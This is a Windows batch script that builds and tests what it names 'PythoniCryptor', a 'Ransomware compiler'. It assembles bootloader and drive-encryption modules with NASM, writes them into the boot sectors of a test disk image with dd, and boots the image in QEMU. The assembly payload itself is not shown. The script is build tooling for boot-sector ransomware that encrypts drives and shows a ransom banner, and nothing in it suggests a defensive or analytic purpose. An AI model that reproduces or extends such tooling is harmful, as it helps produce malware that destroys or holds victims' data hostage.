@echo off
cls
color 5b
Title PythoniC

echo --------------  PythoniCryptor  -------------
echo                --_/\/\/\/\/\/\D> 
echo               Ransomware compiler
echo ---------------------------------------------

echo ### COMPILE PROCESS ###
del BIN\encryptLoader.bin
del BIN\driveEncryption.bin
del BIN\bannerLoader.bin
del BIN\bannerKernel.bin
TOOLS\NASM\nasm.exe -fbin -o BIN\encryptLoader.bin SOURCE\encryptLoader.asm
TOOLS\NASM\nasm.exe -fbin -o BIN\driveEncryption.bin SOURCE\driveEncryption.asm
TOOLS\NASM\nasm.exe -fbin -o BIN\bannerLoader.bin SOURCE\bannerLoader.asm
TOOLS\NASM\nasm.exe -fbin -o BIN\bannerKernel.bin SOURCE\bannerKernel.asm

echo ### WRITE TO TEST DISK ###
TOOLS\DD\dd.exe if=/dev/zero of=TEST_DISK\disk.img bs=1024 count=1440
TOOLS\DD\dd.exe if=BIN\encryptLoader.bin of=TEST_DISK\disk.img
TOOLS\DD\dd.exe if=BIN\driveEncryption.bin of=TEST_DISK\disk.img bs=512 seek=3
TOOLS\DD\dd.exe if=BIN\bannerLoader.bin of=TEST_DISK\disk.img bs=512 seek=5
TOOLS\DD\dd.exe if=BIN\bannerKernel.bin of=TEST_DISK\disk.img bs=512 seek=1

echo ### START VIRTUAL SYSTEM ###
cd C:\Program Files\qemu\
qemu-system-x86_64w.exe -boot c -vga cirrus -m 18 -L vgabios-stdvga -boot menu=off -hda "C:\Users\breke\Desktop\PythoniC\BOOTLOADER\TEST_DISK\disk.img" -rtc base=localtime,clock=host
exit
